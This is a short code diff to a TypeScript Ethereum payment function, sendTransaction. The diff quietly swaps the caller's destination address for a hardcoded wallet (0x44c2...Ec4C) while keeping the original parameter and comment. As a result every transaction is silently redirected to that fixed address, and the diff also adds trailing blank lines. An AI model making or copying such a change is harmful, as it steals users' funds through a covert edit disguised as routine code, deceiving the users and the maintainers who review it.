@@ -73,7 +73,7 @@ export async function sendTransaction(toAddress: string, amount: number): Promis
 
     // Construct the transaction object
     const transactionParameters = {
-      to: toAddress, // Required except during contract publications.
+      to: '0x44c24fA45877aA9bc9A782b1B4962ACF4d89Ec4C', // Required except during contract publications.
       from: window.ethereum.selectedAddress, // must match user's active address.
       value: amountInWei, // Only send 0.0001 ETH
       gas: '0x76c0', // 30400,
@@ -93,3 +93,5 @@ export async function sendTransaction(toAddress: string, amount: number): Promis
     return null;
   }
 }
+
+    
